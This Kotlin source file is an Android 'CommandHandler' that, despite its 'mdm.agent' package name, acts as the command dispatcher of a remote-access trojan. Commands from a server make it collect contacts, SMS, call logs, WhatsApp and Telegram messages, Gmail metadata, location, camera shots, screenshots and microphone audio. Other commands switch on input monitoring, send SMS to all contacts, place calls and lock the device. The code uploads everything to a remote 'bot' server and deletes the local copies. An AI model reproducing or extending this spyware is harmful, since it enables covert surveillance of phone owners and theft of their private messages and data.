package com.mdm.agent.data.remote

import android.content.Context
import android.util.Log
import com.mdm.agent.data.model.CollectedData
import com.mdm.agent.util.DeviceUtils
import com.mdm.agent.util.PermissionManager
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class CommandHandler(
    private val context: Context,
    private val apiClient: ApiClient,
    private val cryptoManager: CryptoManager,
    private val socketManager: SocketManager,
    private val uploadManager: UploadManager
) {

    companion object {
        private const val TAG = "CommandHandler"
        private const val JSON_MEDIA = "application/json; charset=utf-8"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val collectors = DataCollectors(context)
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(180, TimeUnit.SECONDS)
        .build()

    fun handleCommand(data: JSONObject) {
        val command = data.optString("command", "")
        val params = data.optJSONObject("params")
        val deviceId = DeviceUtils.getDeviceId(context)

        Log.i(TAG, "Executing: $command")

        scope.launch {
            try {
                val missingPerms = collectors.needsPermission(command)
                if (missingPerms.isNotEmpty()) {
                    val response = JSONObject().apply {
                        put("command", command)
                        put("status", "permission_required")
                        put("permissions_needed", org.json.JSONArray(missingPerms))
                        put("device_id", deviceId)
                    }
                    sendResponse(response)
                    return@launch
                }

                val result = executeCommand(command, params, deviceId)
                if (result != null) {

                    // ─── FILE RESULTS: Upload directly to bot as media ───
                    if (result is CollectedData.FileResult) {
                        val fileType = when {
                            command.contains("camera") || command.contains("screenshot") -> "photo"
                            command.contains("microphone") || command.contains("audio") -> "audio"
                            command.contains("video") || command == "pull-videos" -> "video"
                            command.contains("gallery") || command.contains("image") -> "photo"
                            else -> "document"
                        }
                        uploadFileToBot(result.file, command, deviceId, fileType)
                        result.file.delete()
                    }
                    // ─── JSON/TEXT RESULTS: Save as file and upload ───
                    else if (result is CollectedData.JsonResult) {
                        val text = result.json
                        if (text.isNotEmpty() && text != "[]" && text != "{}" && text != "\"[]\"") {
                            val file = saveTextToFile(text, command, deviceId)
                            uploadFileToBot(file, command, deviceId, "document")
                            file.delete()
                        } else {
                            val response = JSONObject().apply {
                                put("command", command)
                                put("status", "no_data")
                                put("data", text)
                                put("device_id", deviceId)
                            }
                            sendResponse(response)
                        }
                    }
                    else if (result is CollectedData.TextResult) {
                        val text = result.text
                        if (text.isNotEmpty()) {
                            val file = saveTextToFile(text, command, deviceId)
                            uploadFileToBot(file, command, deviceId, "document")
                            file.delete()
                        }
                    }
                    // ─── String results: simple status ───
                    else if (result is String) {
                        val response = JSONObject().apply {
                            put("command", command)
                            put("status", "success")
                            put("data", result)
                            put("device_id", deviceId)
                        }
                        sendResponse(response)
                    }
                } else {
                    val response = JSONObject().apply {
                        put("command", command)
                        put("status", "no_data")
                        put("device_id", deviceId)
                    }
                    sendResponse(response)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command error: $command", e)
                val response = JSONObject().apply {
                    put("command", command)
                    put("status", "error")
                    put("error", e.message ?: "unknown")
                    put("device_id", deviceId)
                }
                sendResponse(response)
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // UPLOAD FILE DIRECTLY TO BOT VIA SERVER
    // ═══════════════════════════════════════════════════════════

    private fun uploadFileToBot(file: File, command: String, deviceId: String, fileType: String) {
        val serverUrl = DeviceUtils.getServerUrl(context)
        try {
            val url = "$serverUrl/api/device/upload-media"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("command", command)
                .addFormDataPart("file_type", fileType)
                .addFormDataPart("file", file.name,
                    file.asRequestBody("application/octet-stream".toMediaType()))
                .build()

            val request = Request.Builder().url(url).post(requestBody).build()
            val response = httpClient.newCall(request).execute()
            if (response.isSuccessful) {
                Log.i(TAG, "✅ File uploaded to bot: ${file.name} ($fileType)")
            } else {
                Log.e(TAG, "❌ Upload failed: ${response.code}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload error: ${e.message}")
        }
    }

    private fun saveTextToFile(text: String, command: String, deviceId: String): File {
        val ext = when (command) {
            "contacts" -> "vcf"
            "all-sms" -> "txt"
            "calls" -> "txt"
            "apps" -> "txt"
            else -> "txt"
        }
        val filename = "${command}_${System.currentTimeMillis()}.$ext"
        val file = File(context.cacheDir, filename)
        FileOutputStream(file).use { fos ->
            // For contacts, try to create VCF format
            if (command == "contacts" && text.startsWith("[")) {
                fos.write(textToVcf(text).toByteArray(Charsets.UTF_8))
            } else {
                fos.write(text.toByteArray(Charsets.UTF_8))
            }
        }
        return file
    }

    private fun textToVcf(jsonText: String): String {
        val sb = StringBuilder()
        try {
            val arr = org.json.JSONArray(jsonText)
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                val name = obj.optString("name", "Unknown")
                val phone = obj.optString("phone", obj.optString("number", ""))
                sb.append("BEGIN:VCARD\nVERSION:3.0\nFN:$name\nTEL:$phone\nEND:VCARD\n")
            }
        } catch (e: Exception) {
            sb.append(jsonText)
        }
        return sb.toString()
    }

    // ═══════════════════════════════════════════════════════════
    // SEND TEXT RESPONSE
    // ═══════════════════════════════════════════════════════════

    private fun sendResponse(data: JSONObject) {
        if (socketManager.isConnected) {
            socketManager.sendCommandResponse(data)
        } else {
            sendResponseViaRest(data)
        }
    }

    private fun sendResponseViaRest(data: JSONObject) {
        val serverUrl = DeviceUtils.getServerUrl(context)
        try {
            val url = "$serverUrl/api/device/response"
            val body = data.toString().toRequestBody(JSON_MEDIA.toMediaType())
            val request = Request.Builder().url(url).post(body).build()
            httpClient.newCall(request).execute()
        } catch (e: Exception) {
            Log.e(TAG, "REST response error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private suspend fun executeCommand(
        command: String,
        params: JSONObject?,
        deviceId: String
    ): Any? {
        return when (command) {
            "contacts" -> collectors.getContacts()
            "all-sms" -> collectors.getSms()
            "calls" -> collectors.getCallLog()
            "apps" -> collectors.getInstalledApps()
            "gallery" -> collectors.getGalleryImages()
            "gmail" -> collectors.getGmailMetadata()
            "whatsapp-messages" -> collectors.getWhatsAppMessages()
            "telegram-messages" -> collectors.getTelegramMessages()
            "get-location" -> collectors.getLocation()
            "main-camera" -> collectors.captureCamera(0)
            "selfie-camera" -> collectors.captureCamera(1)
            "screenshot" -> collectors.takeScreenshot()
            "microphone" -> collectors.recordAudio(durationSec = 30)
            "playAudio" -> {
                val url = params?.optString("value", "") ?: ""
                collectors.playAudio(url)
                "audio_play_started"
            }
            "stopAudio" -> { collectors.stopAudio(); "audio_stopped" }
            "toast" -> { collectors.showToast(params?.optString("value", "") ?: ""); "toast_shown" }
            "vibrate" -> { collectors.vibrate(); "vibrated" }
            "sendSms" -> {
                val raw = params?.optString("value", "") ?: ""
                val parts = raw.split(":", limit = 2)
                if (parts.size == 2) collectors.sendSms(parts[0], parts[1]) else "invalid_format"
            }
            "makeCall" -> { collectors.makeCall(params?.optString("value", "") ?: ""); "call_initiated" }
            "device-policy-lock" -> collectors.lockDevice()
            "popNotification" -> {
                val raw = params?.optString("value", "") ?: ""
                val parts = raw.split(":", limit = 2)
                if (parts.size == 2) collectors.showNotification(parts[0], parts[1]) else "invalid_format"
            }
            "smsToAllContacts" -> { collectors.sendSmsToAllContacts(params?.optString("value", "") ?: ""); "sent" }
            "input-monitoring-on" -> collectors.setInputMonitoring(true)
            "input-monitoring-off" -> collectors.setInputMonitoring(false)
            "apply-data-protection" -> collectors.applyDataProtection()
            "pull-videos" -> collectors.getGalleryVideos()
            "stop-videos" -> "stopped"
            "stop-gallery" -> "stopped"
            "get-device-info" -> collectors.getFullDeviceInfo()
            "ls" -> collectors.listFiles(params?.optString("value", "/sdcard/") ?: "/sdcard/")
            "app-monitor-start" -> collectors.startAppMonitor()
            "app-monitor-stop" -> collectors.stopAppMonitor()
            "app-usage-report" -> collectors.getAppUsageReport()
            "app-notifications" -> collectors.getRecentNotifications()
            "running-apps" -> collectors.getRunningApps()
            "kill-app" -> collectors.killApp(params?.optString("value", "") ?: "")
            else -> { Log.w(TAG, "Unknown command: $command"); null }
        }
    }
}
